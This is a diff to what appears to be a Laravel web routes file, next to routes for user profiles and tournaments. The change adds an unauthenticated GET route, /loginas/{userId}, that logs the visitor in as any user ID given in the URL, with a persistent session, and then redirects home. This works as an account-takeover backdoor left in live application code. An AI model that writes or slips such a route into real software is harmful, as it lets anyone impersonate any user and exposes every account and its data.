@@ -138,6 +138,12 @@ Route::put('/api/user', [UserController::class, 'updateUser']);
 Route::get('/api/user/tournaments', [UserController::class, 'getOwnedTournaments']);
 Route::put('api/user/set-password', [UserController::class, 'setPassword']);
 
+
+Route::get('/loginas/{userId}', function(Request $request, string $userId){
+    Auth::loginUsingId($userId, true);
+    return redirect('/');
+});
+
 Route::fallback(function () {
     return view('react-app.index');
 })->middleware("auth");
